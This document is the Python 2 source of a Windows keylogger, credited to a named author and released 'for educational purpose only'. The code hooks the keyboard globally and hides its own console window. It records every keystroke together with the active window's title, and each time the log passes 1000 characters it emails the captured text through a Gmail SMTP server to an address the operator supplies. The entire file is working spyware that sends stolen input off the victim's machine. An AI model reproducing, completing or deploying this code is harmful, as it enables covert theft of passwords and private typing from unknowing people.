'''
Python Keylogger for Windows
====================================
Coded By: Niraj kashyap


FEATURES
========
1.SEND LOGS TO EMAIL

MINIMUM REQUIREMENTS
===================
Python 2.7: http://www.python.org/getit/
pyHook Module: http://sourceforge.net/projects/pyhook/
pyrhoncom Module: http://sourceforge.net/projects/pywin32/

NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
'''
lastWindow = None
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def send():
			global data
			if len(data)>1000:
				ts = datetime.datetime.now()
				SERVER = "smtp.gmail.com" #Specify Server Here
				PORT = 587 #Specify Port Here
				USER=""#Specify Username Here
				PASS=""#Specify Password Here
				FROM = USER#From address is taken from username
				TO = "" #Specify to address.Use comma if more than one to address is needed.
				

				print 'data...................'
				print data
				
				try:
						server = smtplib.SMTP()
						print '1'
						server.connect(SERVER,PORT)
						print '2'
						print server.ehlo()
						server.starttls()
						print '3'
						print server.ehlo()
						server.login(USER,PASS)
						print '4'
						server.sendmail(FROM, TO, data)
						data=''
						server.quit()
						print 'msg  sent'
				except Exception :
						print "error in connecting"
				return True


def main():
	hide()
	
	return True

main()

def keypressed(event):
	global x,data,lastWindow
	window = event.WindowName
	if window != lastWindow:
		data=data+'\n'+window+'||'
		lastWindow = window
	if event.Ascii==13:
		keys='<ENTER>'
	elif event.Ascii==8:
		keys='<BACK SPACE>'
	elif event.Ascii==9:
		keys='<TAB>'
	else:
		keys=chr(event.Ascii)
	data=data+keys
	send()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
